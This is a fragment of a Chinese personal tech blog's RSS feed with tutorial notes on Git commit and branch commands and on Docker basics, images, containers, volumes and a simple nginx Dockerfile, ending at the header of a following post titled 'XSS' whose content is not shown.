&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 提交暂存区到仓库区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git commit -m [message]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 提交暂存区的指定文件到仓库区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git commit [file1] [file2] ... -m [message]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 提交工作区自上次commit之后的变化，直接到仓库区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git commit -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 提交时显示所有diff信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git commit -v&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 使用一次新的commit，替代上一次提交&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 如果代码没有任何新变化，则用来改写上一次commit的提交信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git commit --amend -m [message]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 重做上一次commit，并包括指定文件的新变化&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git commit --amend [file1] [file2] ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;更多指令和插件下载 &amp;lt;&lt;a class=&#34;link&#34; href=&#34;https://gitee.com/all-about-git&#34;&gt;Git 大全 - Gitee.com &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;标签&lt;/p&gt;
&lt;p&gt;查看信息&lt;/p&gt;
&lt;p&gt;远程同步&lt;/p&gt;
&lt;p&gt;撤销&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;git分支&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git分支&#34;&gt;#&lt;/a&gt; Git 分支&lt;/h2&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;C:/Users/20957/AppData/Roaming/Typora/typora-user-images/image-20240416113826761.png&#34; alt=&#34;image-20240416113826761&#34;&gt;&lt;/p&gt;
&lt;p&gt;我曾在搭建这个博客时遇到了关于分支的很大的问题，github 更改过一次分支，将 master 改为了 main，但是我本地依旧是 master，就需要更改分支&lt;/p&gt;
&lt;h3 id=&#34;分支的指令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分支的指令&#34;&gt;#&lt;/a&gt; 分支的指令&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 列出所有本地分支&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git branch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 列出所有远程分支&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git branch -r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 新建一个分支，但依然停留在当前分支&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git branch [branch-name]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 新建一个分支，并切换到该分支&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git checkout -b [branch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 合并指定分支到当前分支&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git merge [branch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除分支&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git branch -d [branch-name]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除远程分支&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git push origin --delete [branch-name]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git branch -dr [remote/branch]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h1 id=&#34;docker&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker&#34;&gt;#&lt;/a&gt; Docker&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; 是一个开源的应用容器引擎，基于 Go 语言，并遵从 Apache2.0 协议开源。它可以让开发者将应用程序及其依赖包打包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。&lt;strong&gt;Docker&lt;/strong&gt; 可用于开发应用、交付应用和运行应用等场景&lt;/p&gt;
&lt;p&gt;容器技术的起源可以追溯到解决重复搭建环境、浪费时间和效率的问题。在没有容器技术之前，虚拟机是一种常见的解决方案，但它们存在资源占用大、启动时间慢等问题。与虚拟机不同，&lt;strong&gt;Docker&lt;/strong&gt; 使用容器隔离应用程序的运行时环境，但容器之间可以共享同一个操作系统。这使得容器更轻量且占用更少资源，且启动速度快。因此，&lt;strong&gt;Docker&lt;/strong&gt; 成为了打包服务栈的高效方式&lt;/p&gt;
&lt;p&gt;Docker 的主要用途，目前有三大类。&lt;/p&gt;
&lt;p&gt;**（1）提供一次性的环境。** 比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。&lt;/p&gt;
&lt;p&gt;**（2）提供弹性的云服务。** 因为 Docker 容器可以随开随关，很适合动态扩容和缩容。&lt;/p&gt;
&lt;p&gt;**（3）组建微服务架构。** 通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。&lt;/p&gt;
&lt;h2 id=&#34;docker命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker命令&#34;&gt;#&lt;/a&gt; Docker 命令&lt;/h2&gt;
&lt;h3 id=&#34;基础命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基础命令&#34;&gt;#&lt;/a&gt; 基础命令&lt;/h3&gt;
&lt;p&gt;启动 Docker： &lt;code&gt;systemctl start docker&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;关闭 Docker：  &lt;code&gt;systemctl stop docker&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;重启 Docker： &lt;code&gt;systemctl restart docker&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;docker 设置随服务启动而自启动： &lt;code&gt;systemctl enable docker&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查看 Docker 运行状态： &lt;code&gt;systemctl status docker&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查看 Docker 版本号信息： &lt;code&gt;docker version &amp;amp; docker info&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Docker 帮助命令： &lt;code&gt;docker --help&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;镜像-容器命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#镜像-容器命令&#34;&gt;#&lt;/a&gt; 镜像 / 容器命令&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/16/lkoNY3MnVQPK4Hy.jpg&#34; alt=&#34;533212df4b4d89ffad49622b744f932.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;镜像&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker search 镜像id或name&lt;/code&gt; ：在 Docker Hub（或其他镜像仓库如阿里镜像）仓库中搜索关键字的镜像&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker pull 镜像id或name&lt;/code&gt; ：从仓库中下载镜像，若要指定版本，则要在冒号后指定&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker images&lt;/code&gt; ：列出已经下载的镜像，查看镜像&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker rmi 镜像id或name&lt;/code&gt; ：删除本地镜像&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker rmi -f 镜像id或name&lt;/code&gt; : 删除镜像&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker build&lt;/code&gt; ：构建镜像&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker save&lt;/code&gt; ：将镜像压缩并保存到本地&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker load&lt;/code&gt; ：从本地下载镜像&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;容器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker ps&lt;/code&gt; ：列出运行中的容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker ps -a&lt;/code&gt;  ： 查看所有容器，包括未运行&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker run&lt;/code&gt; ：启动容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker stop 容器id或name&lt;/code&gt; ：停止容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker kill 容器id&lt;/code&gt; ：强制停止容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker start 容器id或name&lt;/code&gt; ：启动已停止的容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker inspect 容器id&lt;/code&gt; ：查看容器的所有信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker container logs 容器id&lt;/code&gt; ：查看容器日志&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker top 容器id&lt;/code&gt; ：查看容器里的进程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker exec -it 容器id /bin/bash&lt;/code&gt; ：进入容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exit&lt;/code&gt; ：退出容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker rm 容器id或name&lt;/code&gt; ：删除已停止的容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker rm -f 容器id&lt;/code&gt; ：删除正在运行的容器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker exec -it 容器ID sh &lt;/code&gt; : 进入容器&lt;/p&gt;
&lt;h2 id=&#34;数据卷&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据卷&#34;&gt;#&lt;/a&gt; 数据卷&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;数据卷&lt;/strong&gt;（volume）是一个虚拟目录，是容器内目录与宿主机目录之间映射的桥梁&lt;/p&gt;
&lt;p&gt;Docker 将运用与运行的环境打包形成容器运行， Docker 容器产生的数据，如果不通过 docker commit 生成新的镜像，使得数据做为镜像的一部分保存下来， 那么当容器删除后，数据自然也就没有了。 为了能保存数据在 Docker 中我们使用卷。|&lt;/p&gt;
&lt;p&gt;卷就是目录或文件，存在于一个或多个容器中，由 Docker 挂载到容器，但卷不属于联合文件系统（Union FileSystem），因此能够绕过联合文件系统提供一些用于持续存储或共享数据的特性:。&lt;/p&gt;
&lt;p&gt;卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此 Docker 不会在容器删除时删除其挂载的数据卷。&lt;/p&gt;
&lt;p&gt;数据卷的特点:&lt;/p&gt;
&lt;p&gt;1. 数据卷可在容器之间共享或重用数据&lt;br&gt;
 2. 卷中的更改可以直接生效&lt;br&gt;
 3. 数据卷中的更改不会包含在镜像的更新中&lt;br&gt;
 4. 数据卷的生命周期一直持续到没有容器使用它为止&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/16/XQzpv3Wh8VP1owE.jpg&#34; alt=&#34;9adc1f8d4b0224fc8531ae9cc96249a.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;在宿主机 / 容器中的更改会同步到另一方&lt;/p&gt;
&lt;h3 id=&#34;命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令&#34;&gt;#&lt;/a&gt; 命令&lt;/h3&gt;
&lt;p&gt;创建数据卷： &lt;code&gt;docker volume create my-vol&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查看所有数据卷： &lt;code&gt;docker volume ls&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;删除数据卷： &lt;code&gt;docker volume rm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查看某个数据卷的详情： &lt;code&gt;docker volume inspect&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;清除数据卷： &lt;code&gt;docker volume prune&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;image文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#image文件&#34;&gt;#&lt;/a&gt; image 文件&lt;/h2&gt;
&lt;p&gt;**Docker 把应用程序及其依赖，打包在 image 文件里面。** 只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。&lt;/p&gt;
&lt;p&gt;image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。&lt;/p&gt;
&lt;p&gt;image 文件是通用的，一台机器的 image 文件拷贝到另一台机器，照样可以使用。一般来说，为了节省时间，我们应该尽量使用别人制作好的 image 文件，而不是自己制作。即使要定制，也应该基于别人的 image 文件进行加工，而不是从零开始制作。&lt;/p&gt;
&lt;p&gt;为了方便共享，image 文件制作完成后，可以上传到网上的仓库。Docker 的官方仓库 &lt;a class=&#34;link&#34; href=&#34;https://hub.docker.com/&#34;&gt;Docker Hub &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt; 是最重要、最常用的 image 仓库。&lt;/p&gt;
&lt;h2 id=&#34;dockerfile&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dockerfile&#34;&gt;#&lt;/a&gt; Dockerfile&lt;/h2&gt;
&lt;p&gt;Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。&lt;/p&gt;
&lt;h3 id=&#34;定制镜像&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定制镜像&#34;&gt;#&lt;/a&gt; 定制镜像&lt;/h3&gt;
&lt;p&gt;构建镜像：  &lt;code&gt;docker build -t 镜像名 Dockerfile目录（如是当前所在目录，可用‘.’&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;镜像的定制实际上就是定制每一层所添加的配置、文件。如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是  &lt;code&gt;Dockerfile&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Dockerfile&lt;/code&gt;  是一个文本文件，其内包含了一条条的指令 (Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。&lt;/p&gt;
&lt;p&gt;以  &lt;code&gt;nginx&lt;/code&gt;  镜像为例，这次我们使用  &lt;code&gt;Dockerfile&lt;/code&gt;  来定制。&lt;/p&gt;
&lt;p&gt;在一个空白目录中，建立一个文本文件，并命名为  &lt;code&gt;Dockerfile&lt;/code&gt; ：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ mkdir mynginx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ cd mynginx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ touch Dockerfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;其内容为：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Text&#34;&gt;&lt;figure class=&#34;iseeu highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;FROM nginx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RUN echo &amp;#x27;&amp;lt;h1&amp;gt;Hello, Docker!&amp;lt;/h1&amp;gt;&amp;#x27; &amp;gt; /usr/share/nginx/html/index.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这个  &lt;code&gt;Dockerfile&lt;/code&gt;  很简单，一共就两行。涉及到了两条指令， &lt;code&gt;FROM&lt;/code&gt;  和  &lt;code&gt;RUN&lt;/code&gt; 。&lt;/p&gt;
&lt;h4 id=&#34;from-指定基础镜像&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#from-指定基础镜像&#34;&gt;#&lt;/a&gt; &lt;strong&gt;FROM 指定基础镜像&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就像我们之前运行了一个  &lt;code&gt;nginx&lt;/code&gt;  镜像的容器，再进行修改一样，基础镜像是必须指定的。而  &lt;code&gt;FROM&lt;/code&gt;  就是指定&lt;strong&gt;基础镜像&lt;/strong&gt;，因此一个  &lt;code&gt;Dockerfile&lt;/code&gt;  中  &lt;code&gt;FROM&lt;/code&gt;  是必备的指令，并且必须是第一条指令。&lt;/p&gt;
&lt;p&gt;在  &lt;code&gt;Docker Store&lt;/code&gt;  上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像，如  &lt;code&gt;nginx&lt;/code&gt; 、 &lt;code&gt;redis&lt;/code&gt; 、 &lt;code&gt;mongo&lt;/code&gt; 、 &lt;code&gt;mysql&lt;/code&gt; 、 &lt;code&gt;httpd&lt;/code&gt; 、 &lt;code&gt;php&lt;/code&gt; 、 &lt;code&gt;tomcat&lt;/code&gt;  等；也有一些方便开发、构建、运行各种语言应用的镜像，如 &lt;code&gt;node&lt;/code&gt; 、 &lt;code&gt;openjdk&lt;/code&gt; 、 &lt;code&gt;python&lt;/code&gt; 、 &lt;code&gt;ruby&lt;/code&gt; 、 &lt;code&gt;golang&lt;/code&gt;  等。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。&lt;/p&gt;
&lt;p&gt;如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如 &lt;code&gt;ubuntu&lt;/code&gt; 、 &lt;code&gt;debian&lt;/code&gt; 、 &lt;code&gt;centos&lt;/code&gt; 、 &lt;code&gt;fedora&lt;/code&gt; 、 &lt;code&gt;alpine&lt;/code&gt;  等，这些操作系统的软件库为我们提供了更广阔的扩展空间。&lt;/p&gt;
&lt;p&gt;除了选择现有镜像为基础镜像外， &lt;code&gt;Docker&lt;/code&gt;  还存在一个特殊的镜像，名为  &lt;code&gt;scratch&lt;/code&gt; 。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Text&#34;&gt;&lt;figure class=&#34;iseeu highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;FROM scratch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你以  &lt;code&gt;scratch&lt;/code&gt;  为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，比如 &lt;code&gt;swarm&lt;/code&gt; 、 &lt;code&gt;coreos/etcd&lt;/code&gt; 。对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接  &lt;code&gt;FROM scratch&lt;/code&gt;  会让镜像体积更加小巧。使用 Go 语言开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为  &lt;code&gt;Go&lt;/code&gt;  是特别适合容器微服务架构的语言的原因之一。&lt;/p&gt;
&lt;h4 id=&#34;run-执行命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run-执行命令&#34;&gt;#&lt;/a&gt; &lt;strong&gt;RUN 执行命令&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;RUN&lt;/code&gt;  指令是用来执行命令行命令的。由于命令行的强大能力， &lt;code&gt;RUN&lt;/code&gt;  指令在定制镜像时是最常用的指令之一。其格式有两种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;*&lt;strong&gt;shell* 格式： &lt;code&gt;RUN &amp;lt;命令&amp;gt;&lt;/code&gt; ，就像直接在命令行中输入的命令一样。刚才写的  &lt;code&gt;Dockerfile&lt;/code&gt;  中的  &lt;code&gt;RUN&lt;/code&gt;  指令就是这种格式。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Text&#34;&gt;&lt;figure class=&#34;iseeu highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;RUN echo &amp;#x27;&amp;lt;h1&amp;gt;Hello, Docker!&amp;lt;/h1&amp;gt;&amp;#x27; &amp;gt; /usr/share/nginx/html/index.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;*&lt;strong&gt;exec* 格式： &lt;code&gt;RUN [&amp;quot;可执行文件&amp;quot;, &amp;quot;参数1&amp;quot;, &amp;quot;参数2&amp;quot;]&lt;/code&gt; ，这更像是函数调用中的格式。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;其他指令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他指令&#34;&gt;#&lt;/a&gt; &lt;strong&gt;其他指令&lt;/strong&gt;：&lt;/h4&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/16/Hy4g3sq6nkEbLmQ.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;docker全流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker全流程&#34;&gt;#&lt;/a&gt; Docker 全流程&lt;/h2&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://img2.imgtp.com/2024/04/17/yZoqipkB.png&#34; alt=&#34;20200927104919216.png&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/15/XSS/</guid>
            <title>XSS</title>
            <link>http://example.com/2024/04/15/XSS/</link>
            <pubDate>Mon, 15 Apr 2024 19:22:43 +0800</pubDate>
